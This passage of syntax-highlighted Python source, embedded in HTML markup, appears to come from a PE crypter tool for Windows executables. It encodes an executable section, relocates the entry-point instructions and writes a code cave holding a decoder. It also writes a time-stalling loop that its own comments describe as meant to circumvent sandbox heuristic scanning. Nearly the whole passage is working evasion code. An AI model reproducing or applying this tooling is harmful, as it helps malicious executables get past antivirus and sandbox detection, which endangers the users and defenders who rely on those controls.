style="color:#ff0044;font-weight:400">0</span>					<br />					<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;byte&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;data_to_encode:<br />						byte&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(byte,&nbsp;<span style="color:#ff0044;font-weight:400">16</span>)<br />						<br />						<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(count&nbsp;&gt;=&nbsp;encode_offset)&nbsp;<span style="color:#ff9d00;font-weight:700">and</span>&nbsp;(count&nbsp;&lt;&nbsp;encode_length&nbsp;+&nbsp;encode_offset):<br />							enc_byte&nbsp;=&nbsp;do_encode(byte,&nbsp;encoder)<br />							<span style="color:#0088ff;font-weight:400">#&nbsp;print&nbsp;"Byte&nbsp;%i&nbsp;was&nbsp;%x&nbsp;and&nbsp;is&nbsp;now&nbsp;%x"&nbsp;%&nbsp;(count,&nbsp;byte,&nbsp;enc_byte)&nbsp;#&nbsp;TESTING</span><br />						<span style="color:#ff9d00;font-weight:700">else</span>:<br />							enc_byte&nbsp;=&nbsp;byte&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;byte&nbsp;not&nbsp;within&nbsp;encoding&nbsp;range,&nbsp;maintain&nbsp;original&nbsp;value</span><br />							<br />						count&nbsp;+=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />						encoded_data&nbsp;=&nbsp;encoded_data&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"{:02x}"</span>.format(enc_byte)<br />						<br />					<span style="color:#0088ff;font-weight:400">#&nbsp;make&nbsp;target&nbsp;section&nbsp;writeable</span><br />					pe&nbsp;=&nbsp;make_section_writeable(pe,&nbsp;section_name)<br />					<br />					<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;encoded&nbsp;data&nbsp;to&nbsp;image</span><br />					<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Writing&nbsp;encoded&nbsp;data&nbsp;to&nbsp;file"</span><br />					raw_text_start&nbsp;=&nbsp;section_header.PointerToRawData&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;get&nbsp;raw&nbsp;text&nbsp;location&nbsp;for&nbsp;writing&nbsp;directly&nbsp;to&nbsp;file</span><br />					success&nbsp;=&nbsp;pe.set_bytes_at_offset(raw_text_start,&nbsp;binascii.unhexlify(encoded_data))<br />		<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;decoder				<br />					<br /><span style="color:#3ad900;font-weight:400">'''<br />	Preserve&nbsp;the&nbsp;first&nbsp;few&nbsp;instructions&nbsp;of&nbsp;the&nbsp;binary&nbsp;which&nbsp;will&nbsp;be&nbsp;overwritten&nbsp;<br />	with&nbsp;the&nbsp;jump&nbsp;to&nbsp;the&nbsp;code&nbsp;cave.&nbsp;<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;preserve_entry_instructions(pe,&nbsp;ep,&nbsp;ep_ava,&nbsp;offset_end):<br />	offset=<span style="color:#ff0044;font-weight:400">0</span><br />	original_instructions&nbsp;=&nbsp;pe.get_memory_mapped_image()[ep:ep+offset_end+<span style="color:#ff0044;font-weight:400">30</span>]<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Preserving&nbsp;the&nbsp;following&nbsp;entry&nbsp;instructions&nbsp;(at&nbsp;entry&nbsp;address&nbsp;%s):"</span>&nbsp;%&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(ep_ava)<br />	<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;offset&nbsp;&lt;&nbsp;offset_end:<br />		i&nbsp;=&nbsp;pydasm.get_instruction(original_instructions[offset:],&nbsp;pydasm.MODE_32)<br />		asm&nbsp;=&nbsp;pydasm.get_instruction_string(i,&nbsp;pydasm.FORMAT_INTEL,&nbsp;ep_ava+offset)<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t[+]&nbsp;"</span>&nbsp;+&nbsp;asm<br />		offset&nbsp;+=&nbsp;i.length<br />		<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;re-get&nbsp;instructions&nbsp;with&nbsp;confirmed&nbsp;offset&nbsp;to&nbsp;avoid&nbsp;partial&nbsp;instructions</span><br />	original_instructions&nbsp;=&nbsp;pe.get_memory_mapped_image()[ep:ep+offset]<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;original_instructions&nbsp;<br /><br /><span style="color:#3ad900;font-weight:400">'''&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;calculate&nbsp;the&nbsp;new&nbsp;jump&nbsp;offset&nbsp;given&nbsp;a&nbsp;previous&nbsp;and&nbsp;current&nbsp;location<br />	used&nbsp;with&nbsp;the&nbsp;modify_entry_instructions&nbsp;function<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;update_jump_location(asm,&nbsp;current_address,&nbsp;instruction_offset):<br />	jmp_abs_destination&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(asm.split(<span style="color:#3ad900;font-weight:400">"&nbsp;"</span>)[<span style="color:#ff0044;font-weight:400">1</span>],&nbsp;<span style="color:#ff0044;font-weight:400">16</span>)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;get&nbsp;the&nbsp;intended&nbsp;destination</span><br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;jmp_abs_destination&nbsp;&lt;&nbsp;current_address:<br />		new_jmp_loc&nbsp;=&nbsp;(current_address&nbsp;-&nbsp;jmp_abs_destination&nbsp;+&nbsp;instruction_offset&nbsp;)&nbsp;*&nbsp;-<span style="color:#ff0044;font-weight:400">1</span>&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;backwards&nbsp;jump</span><br />	<span style="color:#ff9d00;font-weight:700">else</span>:<br />		new_jmp_loc&nbsp;=&nbsp;current_address&nbsp;-&nbsp;jmp_abs_destination&nbsp;+&nbsp;instruction_offset&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;forwards&nbsp;jump</span><br />		<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;new_jmp_loc<br /><br /><span style="color:#3ad900;font-weight:400">'''<br />&nbsp;&nbsp;&nbsp;&nbsp;Many&nbsp;executables&nbsp;have&nbsp;entry&nbsp;instructions&nbsp;with&nbsp;relative&nbsp;jumps&nbsp;which&nbsp;can&nbsp;pose&nbsp;a&nbsp;problem<br />&nbsp;&nbsp;&nbsp;&nbsp;after&nbsp;relocation.&nbsp;My&nbsp;simple&nbsp;solution&nbsp;was&nbsp;to&nbsp;grab&nbsp;the&nbsp;absolute&nbsp;address&nbsp;from&nbsp;asm&nbsp;and<br />&nbsp;&nbsp;&nbsp;&nbsp;calculate&nbsp;its&nbsp;relative&nbsp;offset&nbsp;from&nbsp;the&nbsp;current&nbsp;location.&nbsp;I&nbsp;then&nbsp;replace&nbsp;short&nbsp;jumps<br />&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;their&nbsp;long&nbsp;jump&nbsp;counterparts&nbsp;along&nbsp;with&nbsp;the&nbsp;new&nbsp;relative&nbsp;jump&nbsp;location<br />	While&nbsp;I&nbsp;tested&nbsp;this&nbsp;with&nbsp;several&nbsp;example&nbsp;executables,&nbsp;I&nbsp;may&nbsp;have&nbsp;missed&nbsp;some&nbsp;opcodes<br />'''</span>	<br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;modify_entry_instructions(ep_ava,&nbsp;original_instructions,&nbsp;heuristic_decoder_offset,&nbsp;code_cave_address):<br />	updated_instructions&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span>&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;holds&nbsp;the&nbsp;modified&nbsp;data</span><br />	unconditional_jump_opcodes&nbsp;=&nbsp;{	&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"eb"</span>:<span style="color:#3ad900;font-weight:400">"\xe9"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jmp&nbsp;short</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"e9"</span>:<span style="color:#3ad900;font-weight:400">"\xe9"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jmp</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"ea"</span>:<span style="color:#3ad900;font-weight:400">"\xea"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jmp&nbsp;far</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"e8"</span>:<span style="color:#3ad900;font-weight:400">"\xe8"</span>&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;call</span><br />								&nbsp;}<br />	conditional_jump_opcodes&nbsp;=&nbsp;{&nbsp;<br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"77"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x87"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;ja/jnbe</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"73"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x83"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jae/jnb</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"72"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x82"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jb/jnae</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"76"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x86"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jbe/jna</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"74"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x84"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;je/jz</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"7f"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x8f"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jg/jnle</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"7d"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x8d"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jge/jnl</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"7c"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x8c"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jl/jnge</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"7e"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x8e"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jle/jng</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"75"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x85"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jne/jnz</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"71"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x81"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jne/jnz</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"79"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x89"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jns</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"7b"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x8b"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jnp/jpo</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"70"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x80"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jo</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"7a"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x8a"</span>,&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jp/jpe</span><br />									&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"78"</span>:<span style="color:#3ad900;font-weight:400">"\x0f\x88"</span>&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;js</span><br />							&nbsp;&nbsp;&nbsp;&nbsp;}									<br />	<br />	current_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />	prior_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />	added_bytes&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />	<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;current_offset&nbsp;&lt;&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(original_instructions):<br />	<br />		<span style="color:#0088ff;font-weight:400">#&nbsp;get&nbsp;the&nbsp;asm&nbsp;for&nbsp;each&nbsp;instruction</span><br />		i&nbsp;=&nbsp;pydasm.get_instruction(original_instructions[current_offset:],&nbsp;pydasm.MODE_32)<br />		asm&nbsp;=&nbsp;pydasm.get_instruction_string(i,&nbsp;pydasm.FORMAT_INTEL,&nbsp;ep_ava+current_offset)<br />		<br />		<span style="color:#0088ff;font-weight:400">#&nbsp;increment&nbsp;counters</span><br />		prior_offset&nbsp;=&nbsp;current_offset<br />		current_offset&nbsp;+=&nbsp;i.length&nbsp;<br />		<br />		instruct_bytes&nbsp;=&nbsp;original_instructions[prior_offset:current_offset]&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;grab&nbsp;current&nbsp;instruction&nbsp;bytes</span><br />		opcode&nbsp;=&nbsp;binascii.hexlify(instruct_bytes[<span style="color:#ff0044;font-weight:400">0</span>])&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;extract&nbsp;first&nbsp;opcode&nbsp;byte</span><br />	<br />		<span style="color:#0088ff;font-weight:400">#&nbsp;the&nbsp;current&nbsp;address&nbsp;=&nbsp;the&nbsp;code&nbsp;cave&nbsp;address&nbsp;+&nbsp;the&nbsp;length&nbsp;of&nbsp;the&nbsp;heuristic&nbsp;functions&nbsp;+&nbsp;the&nbsp;decoder&nbsp;functions&nbsp;+&nbsp;</span><br />		<span style="color:#0088ff;font-weight:400">#&nbsp;the&nbsp;length&nbsp;of&nbsp;the&nbsp;replaced&nbsp;entry&nbsp;instructions&nbsp;+&nbsp;any&nbsp;additional&nbsp;bytes&nbsp;we&nbsp;add&nbsp;as&nbsp;a&nbsp;result&nbsp;of&nbsp;modification</span><br />		current_address&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(code_cave_address,&nbsp;<span style="color:#ff0044;font-weight:400">16</span>)&nbsp;+&nbsp;heuristic_decoder_offset&nbsp;&nbsp;+&nbsp;prior_offset&nbsp;+&nbsp;added_bytes<br />			<br />		<span style="color:#0088ff;font-weight:400">#&nbsp;check&nbsp;opcode&nbsp;to&nbsp;see&nbsp;if&nbsp;it's&nbsp;is&nbsp;a&nbsp;relative&nbsp;conditional&nbsp;or&nbsp;unconditional&nbsp;jump&nbsp;</span><br />		<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;opcode&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;conditional_jump_opcodes:<br />			new_jmp_loc&nbsp;=&nbsp;update_jump_location(asm,&nbsp;current_address,&nbsp;<span style="color:#ff0044;font-weight:400">6</span>)<br />			new_instruct_bytes&nbsp;=&nbsp;conditional_jump_opcodes[opcode]&nbsp;+&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">"l"</span>,&nbsp;new_jmp_loc)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;replace&nbsp;short&nbsp;jump&nbsp;with&nbsp;long&nbsp;jump&nbsp;and&nbsp;update&nbsp;location</span><br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;opcode&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;unconditional_jump_opcodes:<br />			new_jmp_loc&nbsp;=&nbsp;update_jump_location(asm,&nbsp;current_address,&nbsp;<span style="color:#ff0044;font-weight:400">5</span>)<br />			new_instruct_bytes&nbsp;=&nbsp;unconditional_jump_opcodes[opcode]&nbsp;&nbsp;+&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">"l"</span>,&nbsp;new_jmp_loc)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;replace&nbsp;short&nbsp;jump&nbsp;with&nbsp;long&nbsp;jump&nbsp;and&nbsp;update&nbsp;locatio</span><br />		<span style="color:#ff9d00;font-weight:700">else</span>:<br />			new_instruct_bytes&nbsp;=&nbsp;instruct_bytes<br />			<br />		updated_instructions&nbsp;+=&nbsp;new_instruct_bytes&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;add&nbsp;to&nbsp;updated&nbsp;instructions</span><br />		added_bytes&nbsp;+=&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(new_instruct_bytes)&nbsp;-&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(instruct_bytes)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;by&nbsp;modifying&nbsp;these&nbsp;to&nbsp;long&nbsp;jmps&nbsp;we're&nbsp;adding&nbsp;bytes</span><br />		<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;updated_instructions	<br />	<br /><span style="color:#3ad900;font-weight:400">'''<br />	Generate&nbsp;the&nbsp;instruction&nbsp;that&nbsp;will&nbsp;jump&nbsp;back&nbsp;to&nbsp;the&nbsp;new&nbsp;entry&nbsp;instruction&nbsp;to&nbsp;restore&nbsp;execution&nbsp;flow&nbsp;<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;build_new_entry_jump(current_address,&nbsp;new_entry_address):<br /><br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;new_entry_address&nbsp;&lt;&nbsp;current_address:<br />		new_entry_loc&nbsp;=&nbsp;(current_address&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">5</span>&nbsp;-&nbsp;new_entry_address)&nbsp;*&nbsp;-<span style="color:#ff0044;font-weight:400">1</span>&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;backwards&nbsp;jump</span><br />		jmp_instruction&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"\xe9"</span>&nbsp;+&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">"l"</span>,&nbsp;new_entry_loc)<br />	<span style="color:#ff9d00;font-weight:700">else</span>:<br />		new_entry_loc&nbsp;=&nbsp;(current_address&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">5</span>&nbsp;-&nbsp;new_entry_address)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;forwards&nbsp;jump</span><br />		jmp_instruction&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"\xe9"</span>&nbsp;+&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">"L"</span>,&nbsp;new_entry_loc)<br />	<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;jmp_instruction<br /><br /><br /><span style="color:#3ad900;font-weight:400">'''<br />	Generate&nbsp;the&nbsp;heuristic&nbsp;bypass&nbsp;time-sink&nbsp;code<br />'''</span>	<br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;generate_heuristic(loop_limit):<br /><br />	fill_limit&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">3</span>&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;the&nbsp;maximum&nbsp;number&nbsp;of&nbsp;fill&nbsp;instructions&nbsp;to&nbsp;generate&nbsp;in&nbsp;between&nbsp;the&nbsp;heuristic&nbsp;instructions</span><br />	heuristic&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	heuristic&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x33\xC0"</span>&nbsp;&nbsp;														<span style="color:#0088ff;font-weight:400">#&nbsp;XOR&nbsp;EAX,EAX</span><br />	heuristic&nbsp;+=&nbsp;add_fill_instructions(fill_limit)									<span style="color:#0088ff;font-weight:400">#&nbsp;fill</span><br />	heuristic&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x40"</span>&nbsp;&nbsp;&nbsp;															<span style="color:#0088ff;font-weight:400">#&nbsp;INC&nbsp;EAX</span><br />	heuristic&nbsp;+=&nbsp;add_fill_instructions(fill_limit)									<span style="color:#0088ff;font-weight:400">#&nbsp;fill</span><br />	heuristic&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x3D"</span>&nbsp;+&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">"L"</span>,&nbsp;loop_limit)&nbsp;&nbsp;							<span style="color:#0088ff;font-weight:400">#&nbsp;CMP&nbsp;EAX,loop_limit</span><br />	short_jump&nbsp;=&nbsp;binascii.unhexlify(format((<span style="color:#ff0044;font-weight:400">1</span>&nbsp;&lt;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">16</span>)&nbsp;-&nbsp;(<span style="color:#ff9d00;font-weight:700">len</span>(heuristic)),&nbsp;<span style="color:#3ad900;font-weight:400">'x'</span>)[<span style="color:#ff0044;font-weight:400">2</span>:])&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Jump&nbsp;immediately&nbsp;after&nbsp;XOR&nbsp;EAX,EAX</span><br />	heuristic&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x75"</span>&nbsp;+&nbsp;short_jump&nbsp;&nbsp;&nbsp;											&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;JNZ&nbsp;SHORT&nbsp;</span><br />	heuristic&nbsp;+=&nbsp;add_fill_instructions(fill_limit)									<span style="color:#0088ff;font-weight:400">#&nbsp;fill</span><br />	heuristic&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x90\x90\x90"</span>&nbsp;&nbsp;&nbsp;													<span style="color:#0088ff;font-weight:400">#&nbsp;NOP</span><br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;heuristic<br /><br /><span style="color:#3ad900;font-weight:400">'''<br />	This&nbsp;is&nbsp;a&nbsp;very&nbsp;basic&nbsp;attempt&nbsp;to&nbsp;circumvent&nbsp;remedial&nbsp;client-side&nbsp;sandbox&nbsp;heuristic&nbsp;scanning<br />	by&nbsp;stalling&nbsp;program&nbsp;execution&nbsp;for&nbsp;a&nbsp;short&nbsp;period&nbsp;of&nbsp;time&nbsp;(adjustable&nbsp;from&nbsp;options)<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;build_heuristic_bypass(heuristic_iterations):<br /><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;we&nbsp;only&nbsp;need&nbsp;to&nbsp;clear&nbsp;these&nbsp;registers&nbsp;once</span><br />	heuristic_start&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"\x90\x90\x90\x90\x90\x90"</span>&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;XOR&nbsp;ESI,ESI</span><br />	heuristic_start&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x31\xf6"</span>&nbsp;&nbsp;&nbsp;			&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;XOR&nbsp;ESI,ESI</span><br />	heuristic_start&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x31\xff"</span>&nbsp;&nbsp;&nbsp;			&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;XOR&nbsp;EDI,EDI</span><br />	heuristic_start&nbsp;+=&nbsp;add_fill_instructions(<span style="color:#ff0044;font-weight:400">5</span>)<br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;compose&nbsp;the&nbsp;various&nbsp;heuristic&nbsp;bypass&nbsp;code&nbsp;segments&nbsp;&nbsp;</span><br />	heuristic&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span>	<br />	<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;x&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;heuristic_iterations):<br />		loop_limit&nbsp;=&nbsp;randint(<span style="color:#ff0044;font-weight:400">286331153</span>,&nbsp;<span style="color:#ff0044;font-weight:400">429496729</span>)<br />		heuristic&nbsp;+=&nbsp;generate_heuristic(loop_limit)&nbsp;<span style="color:#0088ff;font-weight:400">#+&nbsp;heuristic_xor_instruction</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Generated&nbsp;Heuristic&nbsp;bypass&nbsp;of&nbsp;%i&nbsp;iterations"</span>&nbsp;%&nbsp;heuristic_iterations<br />	heuristic&nbsp;=&nbsp;heuristic_start&nbsp;+&nbsp;heuristic&nbsp;<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;heuristic<br />	<br /><span style="color:#3ad900;font-weight:400">'''<br />	write&nbsp;the&nbsp;code&nbsp;cave&nbsp;containing&nbsp;the<br />	heuristic&nbsp;bypass,&nbsp;decoder,&nbsp;saved&nbsp;entry&nbsp;instructions,<br />	and&nbsp;the&nbsp;jump&nbsp;to&nbsp;restore&nbsp;the&nbsp;original&nbsp;execution&nbsp;flow<br />'''</span>	<br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;write_codecave(pe,&nbsp;code_cave_section,&nbsp;code_cave_raw_offset,&nbsp;heuristic_bypass,&nbsp;decoder,&nbsp;modified_entry_instructions,&nbsp;restore_execution_flow):<br /><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Writing&nbsp;code&nbsp;cave&nbsp;to&nbsp;file"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t[+]&nbsp;Heuristic&nbsp;Bypass"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t[+]&nbsp;Decoder"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t[+]&nbsp;Saved&nbsp;Entry&nbsp;Instructions"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t[+]&nbsp;Jump&nbsp;to&nbsp;Restore&nbsp;Execution&nbsp;Flow&nbsp;"</span><br />	<br />	section_header&nbsp;=&nbsp;get_section_header(pe,&nbsp;code_cave_section)<br />	raw_data&nbsp;=&nbsp;section_header.PointerToRawData	<br />	code_cave&nbsp;=&nbsp;(	heuristic_bypass&nbsp;+&nbsp;<br />					decoder&nbsp;+&nbsp;<br />					modified_entry_instructions&nbsp;+<br />					restore_execution_flow<br />				)<br />				<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t[+]&nbsp;Final&nbsp;Code&nbsp;Cave&nbsp;(len=%i):\n"</span>&nbsp;%&nbsp;(<span style="color:#ff9d00;font-weight:700">len</span>(code_cave))<br />	outline&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	byte_count&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />	code_cave_split&nbsp;=&nbsp;[binascii.hexlify(code_cave)[i:i+<span style="color:#ff0044;font-weight:400">2</span>]&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;i&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(binascii.hexlify(code_cave)),&nbsp;<span style="color:#ff0044;font-weight:400">2</span>)]<br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;cycle&nbsp;through&nbsp;the&nbsp;final&nbsp;code&nbsp;cave,&nbsp;printing&nbsp;out&nbsp;20&nbsp;alpha-numeric&nbsp;characters&nbsp;at&nbsp;a&nbsp;time</span><br />	<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;byte&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;code_cave_split:<br />		<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;byte_count&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">20</span>:<br />			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t&nbsp;&nbsp;&nbsp;&nbsp;"</span>&nbsp;+&nbsp;outline<br />			outline&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />			byte_count&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />		<span style="color:#ff9d00;font-weight:700">else</span>:<br />			outline&nbsp;+=&nbsp;byte<br />			byte_count&nbsp;+=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;byte_count&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">20</span>:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t&nbsp;&nbsp;&nbsp;&nbsp;"</span>&nbsp;+&nbsp;outline<br />	<span style="color:#ff9d00;font-weight:700">print</span><br />	